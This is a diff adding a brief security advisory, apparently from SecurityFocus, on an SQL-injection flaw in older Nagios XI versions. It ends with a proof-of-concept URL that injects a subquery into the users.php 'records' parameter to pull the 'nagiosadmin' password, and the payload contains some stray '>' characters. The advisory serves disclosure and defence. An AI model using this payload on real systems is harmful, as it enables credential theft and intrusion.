@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/42661/info
+
+Nagios XI is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Versions prior to Nagios XI 2009R1.3 are vulnerable. 
+
+http://www.example.com/nagiosxi/admin/users.php?records=int8((select > password from xi_users where username= > CHR(110)||CHR(97)||CHR(103)||CHR(105)||CHR(111)||CHR(115)||CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)))&sortby=username&sortorder=asc&search=&page=1 
